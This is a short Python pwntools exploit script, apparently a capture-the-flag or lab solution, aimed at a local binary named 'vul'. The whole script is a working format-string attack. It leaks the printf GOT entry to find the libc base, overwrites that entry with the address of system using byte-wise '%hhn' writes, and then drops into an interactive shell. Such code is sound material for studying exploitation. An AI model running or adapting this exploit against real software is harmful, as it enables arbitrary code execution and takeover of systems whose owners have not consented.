#!/usr/bin/env python
from pwn import *
local = 1
if local:
	p = process('./vul')
else:
	p = remote('127.0.0.1', 8888)
elf = ELF('./vul')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
printf_got = elf.got['printf']
log.success('printf_got = ' + hex(printf_got))
printf_offset = libc.symbols['printf']
system_offset = libc.symbols['system']
log.success('printf_offset = ' + hex(printf_offset))
log.success('system_offset = ' + hex(system_offset))

def fmt(payload):
	p.sendline(payload)
	leak = p.recvrepeat(0.1)
	print 'leak:', enhex(leak)
	return leak

offset = 5
payload_leak = p32(printf_got) + '%{}$s'.format(str(offset))
printf = u32(fmt(payload_leak)[4:8])
log.success('printf = ' + hex(printf))
libc_base = printf - printf_offset
log.success('libc_base = ' + hex(libc_base))
system = libc_base + system_offset
log.success('system = ' + hex(system))
payload = ''.join(p32(printf_got + i) for i in range(4))
printed = len(payload)
fmt1 = '%{}c'
fmt2 = '%{}$hhn'
for i in range(4):
	byte = (system >> (i * 8)) & 0xff
	addition = (byte - printed + 256) % 256
	if addition > 0:
		payload += fmt1.format(str(addition))
	payload += fmt2.format(str(offset + i))
	printed += addition
print 'payload:', repr(payload)
fmt(payload)
p.interactive()
